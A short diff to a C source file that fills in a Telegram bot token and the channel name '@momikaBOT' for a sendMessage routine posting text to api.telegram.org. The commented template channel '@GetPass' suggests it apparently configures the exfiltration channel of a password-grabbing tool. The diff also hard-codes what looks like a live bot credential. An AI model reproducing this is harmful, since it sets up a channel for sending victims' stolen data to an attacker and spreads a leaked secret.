@@ -17,11 +17,11 @@ void sendMessage(char (*message)[]) {
 
   //INSERT HERE YOUR BOT KEY
   //char token[200] = "948574657:RFGCfkjGDFVSRFCVHGDFfovTFvgt_FVfkRf";
-  char token[200] = "Your_Bot_Token";
+  char token[200] = "5301947210:AAHVYAGZenyzDfS4IxAulAcZO5L7nIbXvkk";
 
   //INSERT HERE YOUR CHANNEL NAME
   //char channel_name[200] = "@GetPass";
-  char channel_name[200] = "Your_Channel_Name";
+  char channel_name[200] = "@momikaBOT";
 
   snprintf(url,600,"https://api.telegram.org/bot%s/sendMessage",token);
   snprintf(data,300,"chat_id=%s&text=%s",channel_name,*message);
